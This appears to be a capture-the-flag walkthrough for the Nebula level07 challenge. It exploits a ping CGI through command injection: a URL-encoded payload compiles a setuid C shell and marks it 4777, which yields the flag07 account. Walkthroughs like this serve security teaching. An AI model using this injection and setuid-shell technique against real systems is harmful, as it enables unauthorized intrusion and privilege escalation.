**Intro**

More scripting source to work with.  In this example we're given a perl script which takes in a host and returns ping data

First, we need to access the script.  In the `flag07` home folder are more interesing files with clues

```
﻿level07@nebula:/home/flag07$ ls -lah
total 9.5K
drwxr-x--- 2 flag07 level07  102 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3.3K 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3.7K 2011-11-20 21:22 thttpd.conf
```

The thttpd.conf file contains the following configuration details

```
﻿# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07
```

So, there's an http server running, serving the index.cgi which pings a host.  

To verify this, we hit the url from another host

```
﻿root@kali:~# curl http://192.168.56.101:7007/index.cgi
<html><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination

```

Sure enough it's listening, [OWASP testing guides](https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)) suggest input like this should be sanitized, but as we saw in the source there is nothing special being done to the input.

Let's urlencode some new commands to inject into the CGI.  I'll use the same shellcode/suid pattern form earlier lessons and I'll need the uid of the flag07 user.


**Get the UID**

```
﻿level07@nebula:/home/flag07$ grep flag07 /etc/passwd
flag07:x:992:992::/home/flag07:/bin/sh
```

**Source: /tmp/shell.c**

```
﻿level07@nebula:/home/flag07$ cat /tmp/shell.c 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main ()
{
	setresuid(992, 992, 992);
	system("/bin/bash");
	return 0;
}
```

**Command to URLEncode**

```
;/usr/bin/cc -o /home/flag07/shell /tmp/shell.c;/bin/chmod 4777 /home/flag07/shell
```

**URL Encoded String**

```
%3B%2Fusr%2Fbin%2Fcc%20-o%20%2Fhome%2Fflag07%2Fshell%20%2Ftmp%2Fshell.c%3B%2Fbin%2Fchmod%204777%20%2Fhome%2Fflag07%2Fshell
```

**Command passed to CGI**

```
﻿root@kali:~# curl http://192.168.56.101:7007/index.cgi?Host=%3B%2Fusr%2Fbin%2Fcc%20-o%20%2Fhome%2Fflag07%2Fshell%20%2Ftmp%2Fshell.c%3B%2Fbin%2Fchmod%204777%20%2Fhome%2Fflag07%2Fshell
<html><head><title>Ping results</title></head><body><pre></pre></body></html>
```

**Results in flag07 home folder**

```
﻿level07@nebula:/home/flag07$ ls -lah
total 18K
drwxr-x--- 1 flag07 level07   60 2016-10-14 15:40 .
drwxr-xr-x 1 root   root     300 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3.3K 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rwsrwxrwx 1 flag07 flag07  7.1K 2016-10-14 15:40 shell
-rw-r--r-- 1 root   root    3.7K 2011-11-20 21:22 thttpd.conf
```

**Flag Captured**

```
﻿level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag
You have successfully executed getflag on a target account
```
